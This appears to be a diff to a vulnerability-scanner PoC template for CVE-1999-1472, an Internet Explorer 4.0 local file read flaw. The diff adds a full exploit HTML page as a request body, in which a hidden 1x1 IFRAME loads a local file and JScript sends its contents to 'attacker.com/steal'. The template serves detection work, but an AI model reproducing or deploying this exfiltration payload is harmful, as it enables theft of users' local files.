@@ -1,8 +1,8 @@
 [info]
 author = "AVE"
-description = "检测目标 Web 服务器是否托管了利用 IE 4.0 Freiburg 漏洞的恶意页面，该页面通过 1x1 像素 IFRAME 加载 file:// 协议本地文件，利用 DHTML 读取文件内容并外传"
+description = "验证 IE4.0 同源策略绕过漏洞（Freiburg）。攻击者构造含有 1x1 像素 IFRAME 的恶意页面，通过 JScript 将 file:// 协议指向的本地文件加载到 IFRAME 中，利用 DHTML 读取文件内容并外传至攻击者服务器。诱导用户访问即触发。"
 id = "POC-AVE-1999-1122"
-name = "CVE-1999-1472 Internet Explorer 4.0 Freiburg 任意文件读取 PoC"
+name = "Microsoft Internet Explorer 4.0 Freiburg File Read PoC"
 severity = "medium"
 tags = [
     "cve-1999-1472",
@@ -15,35 +15,35 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/ie4_hack.html"
+path = "/{{BaseURL}}/ie4_freiburg.html"
 protocol = "http"
+
+[poc.requests.body]
+content = """
+<HTML>
+<HEAD>
+<TITLE>IE4 Jabadoo Hack</TITLE>
+<SCRIPT LANGUAGE="JavaScript">
+function init() { document.all("MyFrame1").src = 'file://c:/Windows/desktop/t1.txt'; setTimeout('getLinks()', 5000); }
+function getLinks() { var x = new ActiveXObject("Microsoft.XMLHTTP"); x.open("GET", "http://attacker.com/steal?data=" + escape(document.all("MyFrame1").document.body.outerHTML), false); x.send(); }
+</SCRIPT>
+</HEAD>
+<BODY onLoad="init()">
+<IFRAME STYLE="width=1px; height=1px;" NAME="MyFrame1" SRC="blank.html">
+</BODY>
+</HTML>"""
+type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
+    "IE4 Jabadoo Hack",
     "MyFrame1",
     "file://",
-    "outerHTML",
-    "Jabadoo",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/ie4demo.html"
-protocol = "http"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "IFRAME",
-    "file://",
-    "DHTML",
 ]
